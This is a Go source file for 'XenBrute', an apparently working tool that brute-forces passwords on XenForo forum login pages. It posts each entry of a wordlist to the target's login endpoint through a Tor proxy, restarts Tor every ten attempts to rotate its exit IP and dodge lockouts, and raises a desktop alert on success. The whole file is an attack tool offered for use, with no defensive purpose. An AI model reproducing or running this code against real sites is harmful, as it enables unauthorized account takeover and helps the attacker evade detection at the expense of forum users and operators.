package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/raifpy/Go/raiFile"

	"github.com/raifpy/Go/errHandler"
)

func get(index int, pw string) {

	data := url.Values{
		"login":           {os.Args[2]},
		"password":        {pw},
		"_xfResponseType": {"json"},
	}

	icerik, err := http.PostForm(os.Args[1]+"/?login/login", data)
	if !(errHandler.HandlerBool(err)) {
		html, _ := ioutil.ReadAll(icerik.Body)
		JsonMap := map[string]interface{}{}
		json.Unmarshal(html, &JsonMap)
		if ok, _ := JsonMap["status"].(string); ok == "ok" {
			if _, vr := JsonMap["html"]; vr == false {
				fmt.Printf("\033[32mPW (%d): \033[0m %s\n", index, pw)
				errHandler.Handler(exec.Command("notify-send", "Pw Found", "Your fucking pw = "+pw).Start())
			} else {
				fmt.Println(index, " Attempted | "+pw)
			}
		} else {
			fmt.Println(index, " Attempted | "+pw)
		}

	}
}

func main() {
	// Tor Proxy Ip | local
	fmt.Println("\n\t\033[33mBetik\033[0m=\033[32m'Sonu\033[0m\033[33m\\n\033[0m\033[32m'\033[0m | \033[34mxen\033[0m\033[3mBrute\033[0m > \033[5m@\033[0m\033[4mraifpy\033[0m\n") // Benim reklam bu :))

	if os.Geteuid() != 0 {
		fmt.Println("\tDamn , please run with \033[31msudo\033[0m | Why : 'systemctl restart tor'")
		os.Exit(1)
	}
	if len(os.Args) < 4 {
		fmt.Println("XenBrute: XenBrute <url ( http://url.com )> <username> <my/worldlist.txt>")
		os.Exit(1)
	}
	pwlist, err := raiFile.ReadFile(os.Args[3])
	errHandler.HandlerExit(err)
	pwlistArray := strings.Split(pwlist, "\n")
	os.Setenv("HTTP_PROXY", "socks5://127.0.0.1:9050")

	var sayi = 0
	for index, eleman := range pwlistArray {
		if sayi == 10 {
			log.Println("Tor refleshing !")
			time.Sleep(time.Second * 6)
			exec.Command("systemctl", "restart", "tor").Run()
			time.Sleep(time.Second * 2)
			log.Println("Tor refleshed !")
			sayi = 0
		}
		go get(index, eleman)
		sayi++
	}
	fmt.Println("Waiting ..")
	time.Sleep(time.Second * 3)
}
